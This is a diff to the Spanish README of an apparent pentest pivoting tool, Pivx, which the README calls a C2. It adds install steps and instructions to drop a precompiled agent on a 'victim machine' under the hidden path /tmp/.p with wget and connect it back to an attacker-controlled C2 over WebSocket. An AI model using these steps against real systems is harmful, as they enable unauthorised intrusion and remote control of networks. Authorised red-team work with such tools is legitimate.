@@ -39,24 +39,60 @@ Pivx/
 
 - **Servidor:** Linux o **WSL2** (la TUN usa `/dev/net/tun`). Se necesita **root**
   (o `CAP_NET_ADMIN`) para crear la interfaz y añadir rutas.
-- **Agente:** Go 1.22+. La compilación descarga gVisor (ver abajo).
+- **Agente:** No necesitas Go instalado si descargas el binario desde
+  [Releases](https://github.com/HangLoose84/Pivx/releases). Solo Go 1.22+ si
+  quieres compilar desde el código fuente.
 
 ## Puesta en marcha
 
 ### 1) Servidor (Python, en Linux/WSL2)
 
+> **Nota para Kali Linux y distribuciones modernas:** Python 3.11+ marca los
+> paquetes del sistema como `externally-managed-environment` y bloquea `pip
+> install` global. Pivx usa un **entorno virtual (`venv`)** para evitar este
+> error. El script `install.sh` lo crea automáticamente.
+
+**Instalación rápida (< 2 minutos):**
+
 ```bash
-cd server
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
-sudo -E $(which streamlit) run app.py
+git clone https://github.com/HangLoose84/Pivx.git
+cd Pivx
+chmod +x install.sh
+./install.sh
 ```
 
-`sudo -E` conserva el entorno del venv para que la TUN se pueda crear. El listener
-WebSocket queda en `ws://0.0.0.0:8765` y la UI en http://localhost:8501.
+**Arrancar el C2:**
 
-### 2) Agente (Go)
+```bash
+sudo server/venv/bin/streamlit run server/app.py
+```
+
+`sudo` es necesario porque el servidor crea la interfaz TUN `/dev/net/tun` y
+manipula la tabla de rutas del kernel. Al invocar directamente el `streamlit`
+del venv no hace falta `sudo -E` ni activar el entorno manualmente.
+
+El listener WebSocket queda en `ws://0.0.0.0:8765` y la UI en http://localhost:8501.
+
+### 2) Agente
+
+> **No necesitas tener Go instalado ni compilar nada** si solo quieres usar
+> Pivx. Descarga el binario precompilado de la pestaña
+> [**Releases**](https://github.com/HangLoose84/Pivx/releases) del repositorio
+> y súbelo directamente a la máquina víctima:
+>
+> ```bash
+> # Desde la máquina víctima (ejemplo con wget):
+> wget https://github.com/HangLoose84/Pivx/releases/latest/download/pivx-agent-linux-amd64 -O /tmp/.p
+> chmod +x /tmp/.p
+> /tmp/.p --server ws://TU_C2:8765
+> ```
+>
+> Binarios disponibles: `pivx-agent-linux-amd64`, `pivx-agent-linux-arm64`,
+> `pivx-agent-windows-amd64.exe`.
+
+#### Compilación desde el código fuente (usuarios avanzados)
+
+Si prefieres compilar el agente tú mismo, necesitas **Go 1.22+**.
 
 Primera vez — obtener gVisor (rama especial `go`) y resolver dependencias:
 
